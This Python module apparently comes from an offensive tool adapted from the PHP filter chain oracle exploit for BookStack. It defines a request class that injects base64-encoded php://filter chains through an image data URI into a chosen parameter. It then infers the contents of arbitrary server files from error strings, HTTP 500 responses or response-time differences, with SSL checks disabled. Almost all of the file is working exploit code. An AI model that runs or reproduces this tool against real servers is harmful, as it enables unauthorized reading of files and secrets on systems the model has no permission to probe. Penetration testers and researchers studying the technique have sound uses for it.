import json
import requests
import time
import base64
from filters_chain_oracle.core.verb import Verb
from filters_chain_oracle.core.utils import merge_dicts
import os,sys,re

##
## https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/
## https://github.com/synacktiv/php_filter_chains_oracle_exploit/tree/b8105a975f9c63b15c0614e6a24cd0a2c7b29599
##

class Requestor:
    """
    A class that constructs and sends HTTP requests with PHP filter chain payloads,
    typically used to leak file contents via PHP's filter mechanism. It supports both
    regular and time-based (error-induced delay) attack methods.
    """
    
    def __init__(self, file_to_leak, target, parameter, data="", headers="{}", verb=Verb.POST, in_chain="", proxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):
        """
        Initialize the Requestor.

        :param file_to_leak: Path to the file to leak.
        :param target: The target URL.
        :param parameter: The parameter name where the payload is injected.
        :param data: Additional data for the request (not actively used here).
        :param headers: JSON string of HTTP headers.
        :param verb: HTTP method to use (default POST).
        :param in_chain: Additional filter chain to append.
        :param proxy: Optional proxy to use.
        :param time_based_attack: If True, compute time-based error delay.
        :param delay: Delay (in seconds) before sending each request.
        :param json_input: (Unused) Whether the request data is JSON.
        :param match: A string to look for in the response text for error detection.
        """
        self.file_to_leak = file_to_leak
        self.target = target
        self.parameter = parameter
        self.headers = json.loads(headers)
        self.verb = verb
        self.json_input = json_input
        self.match = match
        self.data = data
        # If an additional chain is provided, prefix it accordingly.
        self.in_chain = f"|convert.iconv.{in_chain}" if in_chain else ""
        self.delay = float(delay)
        # Configure proxies if provided.
        self.proxies = {'http': proxy, 'https': proxy} if proxy else None

        # Initialize the session for HTTP requests.
        self.instantiate_session()
        
        # If time-based attack is enabled, compute the delay based on error responses.
        if time_based_attack:
            self.time_based_attack = self.error_handling_duration()
        else:
            self.time_based_attack = False

    def instantiate_session(self):
        """
        Create a new requests session with the provided headers, proxies,
        and disable SSL verification.
        """
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.proxies = self.proxies
        self.session.verify = False

    def join(self, *args):
        """
        Join multiple string arguments with a pipe '|' delimiter.
        :param args: Strings to join.
        :return: The pipe-joined string.
        """
        return '|'.join(args)

    def parse_parameter(self, filter_chain):
        """
        Build the parameter dictionary for injection.
        :param filter_chain: The payload to inject.
        :return: Dictionary with the injection parameter as key.
        """
        return {self.parameter: filter_chain}

    def req_with_response(self, filter_str):
        """
        Build and send an HTTP request with a PHP filter chain payload.
        
        It constructs a payload by base64-encoding a string of the form:
          php://filter/<filter_str><in_chain>/resource=<file_to_leak>
        wraps it in a dummy <img> tag, and injects it using the specified parameter.

        :param filter_str: The PHP filter chain (e.g., "convert.base64-encode").
        :return: The HTTP response object.
        """
        # Respect the specified delay between requests.
        if self.delay > 0:
            time.sleep(self.delay)

        # Construct the payload string for PHP's filter.
        payload = f'php://filter/{filter_str}{self.in_chain}/resource={self.file_to_leak}'
        encoded_payload = base64.b64encode(payload.encode()).decode()
        # Create an HTML <img> tag embedding the encoded payload.
        filter_chain_payload = f"<img src='data:image/png;base64,{encoded_payload}'/>"
        merged_data = self.parse_parameter(filter_chain_payload)
        
        try:
            # Dispatch the request based on the HTTP verb.
            if self.verb == Verb.GET:
                return self.session.get(self.target, params=merged_data)
            elif self.verb == Verb.PUT:
                return self.session.put(self.target, data=merged_data)
            elif self.verb == Verb.DELETE:
                return self.session.delete(self.target, data=merged_data)
            elif self.verb == Verb.POST:
                return self.session.post(self.target, data=merged_data)
        except requests.exceptions.ConnectionError:
            print("[-] Could not instantiate a connection")
            exit(1)
        return None

    def error_handling_duration(self):
        """
        Determine the extra time delay caused by triggering an error in the filter chain.
        
        This is done in two steps:
          1. Send a normal request with a simple filter chain ("convert.base64-encode")
             and record the response time.
          2. Send a request with an extended filter chain designed to induce an error.
             The difference in response times is taken as the error-induced delay.

        :return: The additional delay (in seconds) induced by the error.
        """
        # Step 1: Baseline response time.
        base_chain = "convert.base64-encode"
        response_normal = self.req_with_response(base_chain)
        self.normal_response_time = response_normal.elapsed.total_seconds()
        
        # Step 2: Build an error-inducing filter chain.
        blow_up_utf32 = 'convert.iconv.L1.UCS-4'
        # Repeat the blow-up filter 15 times joined by pipes.
        blow_up_chain = self.join(*([blow_up_utf32] * 15))
        chain_triggering_error = f"convert.base64-encode|{blow_up_chain}"
        response_error = self.req_with_response(chain_triggering_error)
        
        # Return the additional time taken by the error-inducing request.
        return response_error.elapsed.total_seconds() - self.normal_response_time

    def error_oracle(self, filter_str):
        """
        Determine if an error condition is present based on the response.
        
        The method checks for an error in one of three ways:
          - If a match string is provided, it checks if that string is in the response.
          - If time-based attack is enabled, it compares the response time against a threshold.
          - Otherwise, it checks if the response HTTP status code equals 500.
        
        :param filter_str: The filter chain string to test.
        :return: True if an error is detected; False otherwise.
        """
        response = self.req_with_response(filter_str)
        
        # Check if a specified match string is present in the response.
        if self.match:
            return self.match in response.text
        
        # For time-based detection, compare elapsed time.
        if self.time_based_attack:
            # If the response time exceeds half of the computed time-based delay (with margin), consider it an error.
            return response.elapsed.total_seconds() > ((self.time_based_attack / 2) + 0.01)
        
        # Fallback: check if the response status code is 500.
        return response.status_code == 500
      
